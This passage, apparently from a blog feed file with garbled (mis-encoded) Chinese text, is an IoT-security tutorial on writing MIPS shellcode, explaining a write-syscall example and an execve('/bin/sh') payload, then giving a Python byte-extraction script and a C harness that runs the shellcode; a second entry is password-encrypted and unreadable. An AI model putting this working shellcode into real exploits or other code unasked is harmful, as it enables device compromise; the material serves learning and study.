<code>0x4142</code> å·¦ç§» <code>16</code> ä½åï¼ˆä¹Ÿå°±æ˜¯ <code>0x41420000</code> ï¼‰æ”¾å…¥ <code>$t6</code> å¯„å­˜å™¨ã€‚</p><p><code>ori $t6,$t6,0x430a</code> å°† <code>$t6</code> ä¸ç«‹å³æ•° <code>0x430a</code> è¿›è¡Œæˆ–è¿ç®—ï¼Œæ‰€ä»¥ <code>$t6</code> å¯„å­˜å™¨é‡Œä¼šæ”¾ <code>0x4142430a</code> è¿™ä¹Ÿå°±æ˜¯ <code>ABC\n</code> çš„ <code>ASCII</code> ç ã€‚</p><p>åœ¨çœ‹åˆ°è¿™ä¸¤æ¡æ±‡ç¼–è¯­å¥çš„æ—¶å€™ï¼Œæˆ‘ä¸ç¦ç–‘æƒ‘èµ·æ¥ï¼Œä¸ºä»€ä¹ˆä¸ç›´æ¥ä½¿ç”¨ <code>li $t6,0x4142430a</code> æŒ‡ä»¤å‘¢ï¼Œæµ‹è¯•äº†ä¸€ä¸‹ç¼–è¯‘é“¾æ¥ä¹‹åçš„å¯æ‰§è¡Œæ–‡ä»¶ä¾ç„¶æ˜¯å°†è¿™å¥æŒ‡ä»¤è½¬æ¢æˆäº† <code>lui $t6,0x4142   ori $t6,$t6,0x430a</code> ï¼Œæœ€ç»ˆæŸ¥é˜…äº†èµ„æ–™å‘ç°åœ¨ <code>MIPS</code> æ¶æ„ä¸­ç«‹å³æ•°é€šå¸¸æ˜¯ <code>16</code> ä½çš„æœ‰ç¬¦å·æ•´æ•°ï¼ˆèŒƒå›´ <code>-32768 ~ 32767</code> ï¼‰ï¼Œå¦‚æœéœ€è¦ä½¿ç”¨ä¸€ä¸ªè¶…å‡ºè¿™ä¸ªèŒƒå›´çš„ç«‹å³æ•°ï¼Œæ±‡ç¼–å™¨ä¼šè‡ªåŠ¨å°†å…¶æ‹†åˆ†ä¸ºä¸¤ä¸ª <code>16</code> ä½çš„ç«‹å³æ•°ï¼Œå¹¶ä½¿ç”¨ <code>lui</code> å’Œ <code>ori</code> æŒ‡ä»¤å°†å…¶è£…è½½åˆ°å¯„å­˜å™¨ä¸­</p><p><code>sw $t6,0($sp)</code> å°† <code>ABC\n</code>è¿™å››ä¸ªå­—ç¬¦å†™å…¥æ ˆä¸­</p><p><code>li $a0,1</code> è®¾ç½® <code>write</code> ç³»ç»Ÿè°ƒç”¨çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå³æ ‡å‡†è¾“å‡ºæµ</p><p><code>addiu $a1,$sp,0</code> å°† <code>ABC\n</code> çš„åœ°å€è®¾ç½®ä¸º <code>write</code> ç³»ç»Ÿè°ƒç”¨çš„ç¬¬äºŒä¸ªå‚æ•°</p><p><code>li $a2,5</code> è®¾ç½® <code>write</code> ç³»ç»Ÿè°ƒç”¨çš„ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå³å­—ç¬¦ä¸²é•¿åº¦ä¸º <code>5</code> ï¼Œ<code>ABC\n</code> åˆ«å¿˜è®°å­—ç¬¦ä¸²æœ«å°¾æ˜¯è¿˜æœ‰ä¸€ä¸ª <code>\x00</code> å­—ç¬¦çš„</p><p><code>li $v0,4004</code> è®¾ç½® <code>$v0</code> å¯„å­˜å™¨ä¸º <code>write</code> çš„ç³»ç»Ÿè°ƒç”¨å·  <a href="https://github.com/spotify/linux/blob/master/arch/mips/include/asm/unistd.h">æŸ¥çœ‹ <code>MIPS</code> æ¶æ„çš„ç³»ç»Ÿè°ƒç”¨å·</a></p><p><code>syscall</code> è§¦å‘ç³»ç»Ÿè°ƒç”¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mips-linux-gnu-as write.s -o write.o</span><br><span class="line">mips-linux-gnu-ld write.o -o write</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä¸¤æ¡å‘½ä»¤é¦–å…ˆä½¿ç”¨æ±‡ç¼–å™¨ <code>mips-linux-gnu-as</code> å°† <code>write.s</code> ä¸­çš„æ±‡ç¼–ä»£ç è½¬æ¢ä¸ºæœºå™¨ç ï¼ˆç”Ÿæˆæ–‡ä»¶ <code>write.o</code> ï¼‰ï¼Œå†ç”¨é“¾æ¥å™¨ <code>mips-linux-gnu-ld</code> å°†åˆšç”Ÿæˆçš„ <code>write.o</code> é“¾æ¥ä¸º <code>write</code> å¯æ‰§è¡Œæ–‡ä»¶ã€‚</p><p>ä¸ºäº†ç®€åŒ–æ±‡ç¼–å’Œé“¾æ¥çš„è¿‡ç¨‹ï¼Œæˆ‘ä»¬æ¥ç¼–å†™ä¸€ä¸ª <code>shell</code> è„šæœ¬ï¼Œèµ·åä¸º <code>nasm.sh</code>ï¼ˆå¦‚ä¸‹ï¼‰</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">src=$1</span><br><span class="line">dst=$2</span><br><span class="line">mips-linux-gnu-as $1 -o s.o</span><br><span class="line">echo &quot;as ok&quot;</span><br><span class="line">mips-linux-gnu-ld s.o -o $dst</span><br><span class="line">echo &quot;ld ok&quot;</span><br><span class="line">rm s.o</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°†ç¼–å†™çš„ <code>shellcode</code> æ–‡ä»¶ï¼Œå˜æˆå¯æ‰§è¡Œæ–‡ä»¶åªéœ€è¦ä½¿ç”¨ <code>./nasm.sh write.s write</code> å‘½ä»¤å³å¯ï¼ˆå¦‚ä¸‹ï¼‰</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305131404932.png" alt="image-20230513140452675"></p><p>å¯ä»¥çœ‹åˆ° <code>ABC\n</code> å­—ç¬¦ä¸²å·²ç»è¢«æˆåŠŸè¾“å‡ºï¼Œç¨‹åºå´©æºƒçš„åŸå› æ˜¯å› ä¸º <code>shellcode</code> æ²¡æœ‰æ­£å¸¸çš„é€€å‡ºï¼Œå¯¼è‡´æ‰§è¡Œäº†ä¸æ­£ç¡®æŒ‡ä»¤è®©ç¨‹åºå´©æºƒã€‚ æƒ³è°ƒè¯• <code>shellcode</code> çš„è¯ï¼Œæ–¹å¼å’Œè°ƒè¯• <code>MIPS</code> æ¶æ„çš„ç¨‹åºæ˜¯ä¸€æ¨¡ä¸€æ ·çš„ã€‚</p><h4 id="execve-ç³»ç»Ÿè°ƒç”¨"><a href="#execve-ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="execve ç³»ç»Ÿè°ƒç”¨"></a><code>execve</code> ç³»ç»Ÿè°ƒç”¨</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.section .text</span><br><span class="line">.globl __start</span><br><span class="line">.set noreorder</span><br><span class="line">__start:</span><br><span class="line">li $a2,0x111</span><br><span class="line">p:bltzal $a2,p</span><br><span class="line">li $a2,0 </span><br><span class="line">addiu $sp,$sp,-32</span><br><span class="line">addiu $a0,$ra,20</span><br><span class="line">li $a1,0</span><br><span class="line">li $v0,4011</span><br><span class="line">syscall</span><br><span class="line">sc:</span><br><span class="line">    .byte 0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68</span><br></pre></td></tr></table></figure><p>å‰å››è¡Œçš„è§£é‡Šä¸Šé¢å·²ç»æè¿‡äº†ï¼Œå°±ä¸å†èµ˜è¿°ã€‚</p><p><code>li $a2,0x111</code> <code>p:bltzal $a2,p</code>   <code>li $a2,0</code> è¿™ä¸‰æ¡æŒ‡ä»¤çš„ç›®çš„å°±æ˜¯ä¸ºäº†æŠŠ <code>addiu $sp,$sp,-32</code> è¿™æ¡æŒ‡ä»¤çš„åœ°å€æ”¾å…¥ <code>$ra</code> å¯„å­˜å™¨ä¸­ã€‚</p><p><code>addiu $sp,$sp,-32</code> æ˜¯ä¸ºäº†å¼€è¾Ÿä¸€ä¸ªæ–°çš„æ ˆå¸§ï¼Œå¤§å°ä¸º <code>0x20</code></p><p><code>addiu $a0,$ra,20</code> è¿™ä¸ªæŒ‡ä»¤ä¸­çš„ <code>20</code> å¾ˆè®²ç©¶ï¼Œè¿™å°±è¦ç‰µæ‰¯åˆ° <code>sc:</code> ä»¥åŠåé¢çš„ä¸œè¥¿äº†<code>0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68</code> å°±æ˜¯å­—ç¬¦ä¸² <code>/bin/sh</code> ã€‚è€Œè¿™ä¸ªå­—ç¬¦ä¸²ä¹Ÿæ˜¯å­˜æ”¾åˆ°äº† <code>text</code> æ®µï¼Œå°±ä½äº <code>syscall</code> åé¢çš„åœ°å€ã€‚å› ä¸º <code>MIPS</code> æ¶æ„ä¸­ä¸€ä¸ªæŒ‡ä»¤æ˜¯å›ºå®šçš„ <code>4</code> å­—èŠ‚ï¼Œä¸Šé¢æåˆ°çš„ <code>$ra</code> å¯„å­˜å™¨å­˜å‚¨äº† <code>addiu $sp,$sp,-32</code> çš„åœ°å€ï¼Œè€Œè¿™ä¸ªæŒ‡ä»¤è·ç¦» <code>/bin/sh</code> ä¸­é—´è¿˜æœ‰ <code>5</code> ä¸ªæŒ‡ä»¤ï¼Œ<code>4*5 = 20</code> å­—èŠ‚ã€‚å› æ­¤è¿™é‡Œçš„ <code>$a0</code> æ‹¿åˆ°äº† <code>/bin/sh</code> å­—ç¬¦ä¸²çš„åœ°å€ã€‚</p><p>ç›®çš„æ˜¯æ‰§è¡Œ <code>execve(&quot;/bin/sh\x00&quot;,0,0)</code> ï¼Œæ‰€ä»¥æˆ‘ä»¬å°† <code>$a1</code> <code>$a2</code> å¯„å­˜å™¨è®¾ç½®ä¸º <code>0</code> ï¼Œä½¿ç”¨ <code>li</code> æŒ‡ä»¤è¿›è¡Œèµ‹å€¼å³å¯ï¼Œ<code>execve</code> ç³»ç»Ÿè°ƒç”¨å·ä¸º <code>4011</code>ã€‚</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305142032761.png" alt="image-20230514203232473"></p><h4 id="shellcodeçš„æå–ä¸æµ‹è¯•"><a href="#shellcodeçš„æå–ä¸æµ‹è¯•" class="headerlink" title="shellcodeçš„æå–ä¸æµ‹è¯•"></a>shellcodeçš„æå–ä¸æµ‹è¯•</h4><p>å°† <code>shellcode</code> æå–çš„è¯ï¼Œæˆ‘ç”¨çš„æ–¹æ³•æ˜¯å°†å…¶æ”¾åˆ° <code>IDA</code> é‡Œé¢ï¼Œç„¶å <code>shift+e</code> æå–ï¼ˆå¦‚ä¸‹ï¼‰</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305142034440.png" alt="image-20230514203453331"></p><p>ç„¶åç”¨ä¸‹é¢çš„ <code>python</code> è„šæœ¬ï¼Œ<code>x</code> åˆ—è¡¨é‡Œé¢æ”¾çš„æ˜¯åˆšåˆšæå‰çš„æ•°æ®ï¼Œæœ€åè¾“å‡ºçš„å†…å®¹ä¾¿æ˜¯ <code>shellcode</code> å­—èŠ‚ç </p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">x = [  <span class="number">0x24</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x11</span>, <span class="number">0x04</span>, <span class="number">0xD0</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x24</span>, <span class="number">0x06</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x27</span>, <span class="number">0xBD</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x27</span>, <span class="number">0xE4</span>, <span class="number">0x00</span>, <span class="number">0x14</span>,</span><br><span class="line">  <span class="number">0x24</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x24</span>, <span class="number">0x02</span>, <span class="number">0x0F</span>, <span class="number">0xAB</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x0C</span>]</span><br><span class="line"><span class="built_in">list</span>=[]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter the endian of the shell code&quot;</span>)</span><br><span class="line">choice=<span class="built_in">input</span>()</span><br><span class="line"><span class="keyword">if</span> choice==<span class="string">&quot;little&quot;</span>:</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(x),<span class="number">4</span>):</span><br><span class="line">    <span class="built_in">list</span>.extend(<span class="built_in">reversed</span>(x[i:i+<span class="number">4</span>]))</span><br><span class="line"><span class="keyword">if</span> choice==<span class="string">&quot;big&quot;</span>:</span><br><span class="line">  <span class="built_in">list</span> = x</span><br><span class="line">result = <span class="string">&#x27;&#x27;</span>.join([<span class="string">f&#x27;\\x<span class="subst">&#123;<span class="built_in">hex</span>(num)[<span class="number">2</span>:].zfill(<span class="number">2</span>)&#125;</span>&#x27;</span> <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">list</span>])</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>æœ€åå°±æ˜¯æµ‹è¯•æå–å‡ºæ¥çš„å­—èŠ‚ç èƒ½å¦æ­£ç¡®æ‰§è¡Œï¼Œæˆ‘ä»¬ä½¿ç”¨ä¸‹é¢çš„ <code>C</code> è„šæœ¬ï¼ˆè¦<strong>æ³¨æ„ç¼–è¯‘å®Œç¨‹åºçš„å­—èŠ‚åº</strong>ï¼Œå¦‚æœç¨‹åºæ˜¯å¤§ç«¯çš„ï¼Œè€Œ <code>shellcode</code> æ˜¯æŒ‰ç…§å°ç«¯åºå†™çš„ï¼Œé‚£ä¹ˆè‚¯å®šæ˜¯è¿è¡Œå¤±è´¥çš„ï¼‰</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//mips-linux-gnu-gcc shellcode.c -o test -static -g</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[] = &#123;</span><br><span class="line"><span class="string">&quot;\x24\x06\x01\x11\x04\xd0\xff\xff\x24\x06\x00\x00\x27\xbd\xff\xe0\x27\xe4\x00\x14\x24\x05\x00\x00\x24\x02\x0f\xab\x00\x00\x00\x0c/bin/sh&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> (*s)(<span class="type">void</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sc size %d\n&quot;</span>, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">    s = shellcode;</span><br><span class="line">    s();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305142127071.png" alt="image-20230514212707011"></p><h3 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h3><p><a href="https://b0ldfrev.gitbook.io/note/iot/mipsarm-hui-bian-xue-xi">mips_armæ±‡ç¼–å­¦ä¹  - Note (gitbook.io)</a></p><p><a href="https://prowes5.github.io/2019/07/21/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">è·¯ç”±å™¨æ¼æ´åˆ†æç¯å¢ƒæ­å»º | Prowes5â€™s Blog</a></p><p><a href="https://blog.csdn.net/yalecaltech/article/details/117326975">(47æ¡æ¶ˆæ¯) MIPSä¸‹shellcodeç¼–å†™_Elwood Yingçš„åšå®¢-CSDNåšå®¢</a></p><p><a href="https://www.yuque.com/cyberangel/rg9gdm/yxb067">ã€ŠIoTä»å…¥é—¨åˆ°å…¥åœŸã€‹(1)â€“MIPSäº¤å‰ç¼–è¯‘ç¯å¢ƒæ­å»ºåŠå…¶32ä½æŒ‡ä»¤é›† (yuque.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> IOTå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MIPSæ¶æ„ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é¢„æµ‹urandomçš„è¾“å‡º</title>
      <link href="/posts/81a94eee.html"/>
      <url>/posts/81a94eee.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="e57ec3904e8cf63db8c06a9774839e55a0222f8a0a7dee2b8599297dd7a18a96">0e96a196e04ab582d32680aaeaf05fdc0ff4581cd2e016adf497a33e0f0f5a405d915f1c487decf1b6fba2119b16df0d59108d3e9eb2945b2c0081761412eaea7fbdfbedf9e83ce93341376d4aad854aa0c0280e8fe9d0f964595a297dbbe7f77de4630cb58d7daf7a5742904f9f9711b335d4b42d59fa70505f25a4029d513d5f360da5f428c5016a9df25477df8f3ad29a3f8afff726687bb4a22861a085f4fb25fc983aeec68f4f97bee6c9065d5dba8186e5bce2ebce915a4d34f4122d38d1c67574c1880c351eace7f230814269c7145ead519e6a7452b31fb8e927abae0cc8807ada781646a507da0c646b3c8fa8feac2f6ec4be6f25e264fc5c0bd3b71436bfe4ae76852197a72fbeaa6eca3e8a2cee12930366e12bca3f7f9f7513a2aba8677c16def2386ba0558990fbe01d41e6fdaf366eab6718e1e0518e7bed1031ef418452be612992179ff65ed1ee2400f3b9b160fdd893dced86ec3be0356402a43c9a243dc605ed9d6c470afa445a5d0e8c1932b88e2b3a61d0aa25abb6afc2ce6fe2333234477be7c6afcd013cae366eaaaac7ece66f33f656f597039a73707860395e943ce0e5038892bded9a3e5bfe54e5d72b800b8bd24eeb592da1a9adbec3b922e188249d29d19a90307b5589dbb90a8d3d6cbb66a76cd9bb202e645546c5d64ba38572db583b7b534aa242e9b0e4e40c18db3f503210393b90e4b98b616932b75c3a2653b0db09b581a55b8bc871cb68c4fce0ee08179380d9b7a2b25b5e5bbde6bcbffab37503e90fd683ce6bb6c2c7d34c379e334f65a3e308acf05d27d09c2f359abf6cf18b85099c1dc309b94def0c739d417aa5a70817b19e3a7c1633cde4739b3e4d15995a2c74849543a260539c99481c67741ded3dc56e2b6f86eb585669e8bef86869a0dfca3b47df88d9f61253c30d07c7be0f39c1bfe26b2834838e9dfd65acbfbd4005fd8e06e2504eb6572c1958061d4602054276ddc3bdf56ce8d7606844a0d856feb85d17a9bd236fb07a7b00ea84f5f4b17fe568ed8ae78764ede256a886fbaea7ded0408d06ea42c4835c15b5a9d0b7cbcf9cf25285e43f8fe34e276f2937ce0bf94edb1447eb776183ad93646a3b7aef7f709edc071bfb0c368786b720e7fb14cb3fd7f08cd94cf043b8da68f057594c6550bde45400e8c949be246b99142d894fd9331bcd0b46149143d67270f75da809b91fc9f40be9e9fb036fa9be8c37ab87e5626266dc39505af0cd1cec1714e2a2bb599af10a45e5c4bb20b6a21cb7fd81bf4258562ddc8282de2cdf10f040ae1621cacc6bfa629d5ae0f73ddb6f1850d24f14404aae5b2dfea2b377c5451d579a7379757bf2063a8c4e30f70aa7d27e80f95759857d2fab505271ad6b98f03843fb799bc501de834176d2da07a3cba1a6e4e9fabf443936130a31ffc1323d4ba9ee921dc9a76e960510ad96d66df7058e4d3c789668624c6a62018c916f1a4f6e408592eee407302facf2712389d2d15daa04e218a443e0dd4eb0d4661a03ede12ac44c8a1e05f3c5d4748b2748f85728cbad1ee0cbd684fd22300d257f97d9031488d94ad4d853ab344b49af3b466f34cc7f31a588ffdfcece6b6bc2ba4bfce618145366a17b1602dda660310d35cb94d0a9d5fb80907526fdf5dd01eb740a27f88a3fbfe4da73addda6b95f80acbc739544e1e1e8de54efd34a3eff8051d74830dc8b0f5ce11a57b7365dfaf06dfe2fd38d61f4718cb7cf56c4e210977582f465014a556008f0bd1f246db31d06e3f8a4c485d7a340bf9f257887598b16f43515e2f41ffd10d452571bac5b1553fd3d9f6f3291de5c8bdf9671f98e5bc5ffb1b58b65b9048f7bd71c3c31f7346b4e7187eb6a7e397f4ada7162bd79554c556c6960b8bc928240c108442e902416c71b2cb564ddb215d752bc1e61f6f46deb21b2568abff00bb9c5e039b8add90afa1cf80658128e376386215860ec60e2c79e9c2e9cdb30df4510a205b4a7ddc106cca01630db3c3bd818a58adc9ae8132d8d794af21295b7141b33ed1f0816f1e1436d493287c4a87887a563d42f097d26deddac2b3484908b40cb64812c460314c6c0ea76b5d19c61f61959df30fffce21435f2468bfc34a62342b1f0a2f1b67c69f57b4dac0060e06d5f409ae124e02f280b79d1b7f7b90906918608a3b12482849df534f3a0d9742fc15e6816aac8cc17474967260b4ef58a1b8b0dde195048141e49d9ec4324120d0f00b2c2868cee1096194d1c308fede784706b7c3196104c37ce6e1312fa0ebda22207b20c577049ca80dbf086d6a326e215f272d936f0bb5aa55e70d3fede68c0ce627e64c999478e684cfff1092008c46a0c3d671a1e407153e94b2e5317052b474a42b2906f1149895198be23ab74b71fb072ac6c87cced02bebfae148ce86e644242c4a82476877b44ad04d86ef4c5041e86dca1f54a88c0d1f2f2b20d56308192f5a45e7ebc64aa69c97ef0e24b110c22822aa6f373903ba36032d58b3df564773b147d8cab058e68d97eb3c7b30c2a84cfc138bb792176d0d60c427850600fcb668daf54bc9258d779947a05f9f585cb875eccd3ba5189eaf57405109ae1bdebc4d95ffa4d26a7a48e71eefe829c67b263f9bca4ce7a252db693d4a41d951e6cd6821d0fc918e797f142b8c1980c0cc4b73ac62803ae0c227acbfb1c83aea78d96039212a9ccd08c62411ef01b9ffc6813b7331896b2424d0c534740f05425347198b5bcabd61f983ef6934a2dd1d3990d4fed3d41c5f43e5ea5d6fe9849d109380ab599861c9c0c5065e88afc0ac9c2d15748f70d4c74bd2a91dfe475c0ff49b988d1677675bb56f844e81849804822941bb6136a769f68799468c01a1524d8d5773dd5388061dbc070fc2cc0a86daefe616b58b98c99108ece489855c1584a227d0fae29835ac931c72489dc193f284c07ae43c14e46b8ad2adff688188fd728903ffbedcc935bb97b41a3ba4c4ecf2b8b6be8a76731f206b57c481fa7dfa181e140356eb4c8e15e51e4f9fbcec3984db8b18d4a41314d41e54ad4aa297efa5ec6396dac730c8758f4f2d39b3698881c4ab99cb1a21deb45a28ca5cb1e4378ae72998711df75e36a48028f51a27c21c5cc6059bb499d8f974a3734c988f4a41eb6d7c9d35a3b27de0a80aef43bec37aabf20c89d45a27a231063208e2e4c60f4f78041c899d5c3e5d357b1e1b26252e9a455eb0006d6c433bf82452dcefba1c34d20510c61e1a372ac6f255985c9b7cd01a4bfa4381027ea5a37f712859dbf45719fb48b5bf59f214f4756aea3c40961f3df635106784afeaa6aad1be0d3f6c7730604b0c5bec1cfaa41c40133c0aedd3a46da83a17b5b8aaf38b2e4698fdb794173425516510a5ea37c8b711525cd5b0e9d53471eff840d23302fbc93877f7d9a9e80658d1b9a4d45cd4b2843fa9f8a5f580ec6bfa55b8574d813b0bea57f62ddbe767bab122014c83462cbadf992f4c2d19a8459229e78198bbfbb91fa4ea53ec5b5e85489adb5a04bf3d24dd51af27b69f15e599ac0e28081e183efc7ddcac196cd5aa610b41d78d19200695486e06c75f6e7235a59d01215aeb3ba396442e65a963098bdb7d26895c16bc9fd4c3e0a3389929f91a137502e622d4cbe70ead0b1adfc1124e3e97de2e7fd3d2b94e294327b663c2bca5f3ab29a1756c47f36005ab59c9fbd708582bb6729e941aaa676fdd4c7e4d111d0a6fd625821436e7a9f36033fd028dd658c7407dfce99d9b8fe94a865dffed1bf59593d6309ba4f838ef37ab971403d0c06bc409e5b6f0bb5e571a966e9291df3cb475dcd2babf9f539a3cb955322b4528bdeaab79c1b8ba4180bcbe47a76d3201383cc08989cfb131e12573500b5a68a5530ba32c626fe9d4ef4c3d86a02d42508a2b5d560c17498493a864d121d4eb6e37274224e28a5181bc44970cb6294be066b8fa8c4cea7b00b34e4ca01953dd0e80915e2a80f1dcc9d722577b35936878827411ab974689cfc7e39b51c67788c429ba5e6a42810e84decd0781b488aed7bd03a1c7376a6a60cd4ed3802c2a1ff38fbb328434fbbdbf28303284726ad8c77f000682c02b3a5758170b3b2b4b600f6537639eaa6f6b2511a5c361adf11914e94787a62dce83147692aa02daf4e9990cae376325f781843af90c1a32033c1ba61501ba35d4a05c06ce4c69ed421e123787fc8d5c26690b119544c67acb4fc3a77107eada1e48a1e0135ab9f50964e76d48ba67b6988c28a32295d8196d81f30471dc22bc9fd3df46e7bc58f3c9e64e5aec209e75e560eba8cec35fcb4ff5019925c5edb2af3909687eff7526791d265e559101cd92e00ca52f1d13bf9074bb23d492e775baa8290752998f7d860369ef4a9b87d536ec9c814bc8ce2b61318988423d3e147e94258380640f2bc01794eb1451dac192a3b8ed83ed3008ab5060a72b69d14207a6753bb6991359e090b388a8f9e41af7bd132087bf998528a8eeabe98df119828f2d5bdbce291ffb05c71939c09caec749ae0724aee5c4300f6d9f0db3b5b984db07f9ed45ea5ef989da3a69c9ebf7d5c5460f922bfcabbc77e088d5a364a1fc8aa394e7cb073c6a6cc6389686b3b88cc1ee915f76803838e114884c553d639bdc89659f23960c6e4556664714315926bcdc4f93d66d35f3658d81b7bfa0d973c4c461b14d5713631549cd04d401bb8cbc973233d00644e52430e55ba6298269370bf46570d187c8c6f3024af3bd8b5ab8f444fd904568dc5d9c48150ad33b721fb71b43f5e6291b745465adbf06adb756da9dbc4822effe26e40f28bf41a25db552dca6bdfd015f97eb3edb4104d25f30c6d9bc2e5d7baafb247337c14f4c0bb05a00890c17938774550ecfffd0d0a49d38225940afd163c62cfded4cd6bc8e43614beebf2b593cd1e788cb8b54e5438b8dbc9f0ca4a1cb8348ca23a33974834ddd88982246bf4114e5e725713ac93430c1d5509546ecb10668b90e153598da4091b557e2ad1422b0a7b9d8ce0ba11d34ff17a99b01e5b0b4155f4e01353dc8906dc6a5d590234bd1a358e9d723aea4d946d1410a08492f2bbc49fc7057c464240b83f6cab82554ea7c95a4b75c032541ab4f7c32155ebf043aa6898a4092c0ff44b2804e826aa00072b4d5075476f39986e3e26c6e9583e958eebfd9f601a617211abe0f157591b8c9b6446625f3472dc22b1fd67df51daa7988696429f6e6264fce6f3bc288bbadb6ce36a61aa8ae1e06f09fb4b0fce2361192581919d78faaf3cb3a95ecd4be6afb5191f61dd363f3e3a0d3ade657745483e20ded2f1ec97f5d01947273a80be67f82c5207bdcdb2dda94096cca259e4d20b374dc1df5e2add0cd796e31740fc065902e38427dddb9f55b477581c3c51d31a1850721e5829387ea6ce057726e9eee992cf5c1758a725e0212e7ec5487fead4b663700bb29c70a62153bf2ac5e720f19cc84a3d73b7b2dcd4a26bf472d41ecf92ede74a589bd9bbc98b17062b2839d866457b9fe15bff651366bc12152d9bc407b5cdda4e4fbe458c494bf01e5ebcbc1e41f7d89c7c1af76ea3c1c29b4b4cb5dc2cdb4d5f5a0fe8c77babea5c4f783d1bb6a4c9c0eb7400c4ccb18207616346d1a488e839a1ff6db1e47cfeea4f1b62671cda9e1b2d1260198dcfde088d6e4ae282da1dd13dd60fe8fc6d29ea67e42b3279adc85254ddc6a2329d38db9f58d32f851091fafba1b63197f556ec8b0039184f3ac8ad16661dc8fb8ce4dc77dfbb2c8763047e03915294edb80e956fa9382d7cdf8aac6981ee31f11ad573935b03350eed2aa826bc07dd32cc2aabd317041826850f6dad24c999614a7dc6c9c3d3f03659cf1939beb8f938e1d3c4b7aceef1f77f224fe812f28c0762688d582193d815bec469d832ca9e329afde4ca8927f7c2bb45764feb8aad5e38ae0a3938c7ebb120a8af932b9179d23abbd2fd824490780a4b975dcbb70b860d76471fb139ca585429c53876dabb60dd55cce5493de6e750da0a9718fd6505239a42cf3596594ba8b21d29a91fa102b7bc978c48005ce41941955a8b367f867b7bd895413d68c4f3c1661d2360c6c5616a600f4bc39fb79e2c85df40387f3276dec44120263d3d033f22cf75f3a35c590fc67603673f2da27ca189bbda3369cffafaff04c9cdde2948fbbac29ff637ac760d38ad63af7aed0881f5eea259758e1d43d3c4b12152fecea05cff5aa90b45578352d07d9b89506f6037ae37c7d45b18ca72949880ad53de89fcf3fccf9a13256d1c0d9816fc9f1b9ccd103ae07e9338fad5c40809e3f70127bf96a055657cc1b9ba763b2c261e83547a95736f57f19d90a4c0f34ceb8bee87edef2404c70dddd9756c2b4e61af33fdd5a423a87034677a5283dae35ad4a9ee6f5dd7f5729e0dee61e72a09085dd542d1eca6f4def438b5d0c7bbf3f98c7e82a9115d384ecc3d401492c4b80936a2441fe142ec2534d740dfe0ce6ccf7af5cbe97615f6792764e9b50d92a3ad324fea13750cde6780c5a5fd1b4f13fc11b5ed8157285ee1ecee74645db6d5cf8f090f49602fad4b5bab0c48d31f65d938f0283f8f0764d8ed13593562aa9374e37b9e212d09e755e9000f09ebfdc1741b366110561e12fcc7b0667ba3cb8c06b6225a5da55ce236e663040f5fe4efbe76a3ef891126d16fa55c20e73a3d24503a5d33690075007fbffcdee7e14f8ea0afb40fcecb66c6e8db580b29b9d120a86dbd99920c0743771530</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> ç§æˆ¿èœ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> lab </tag>
            
            <tag> urandom </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
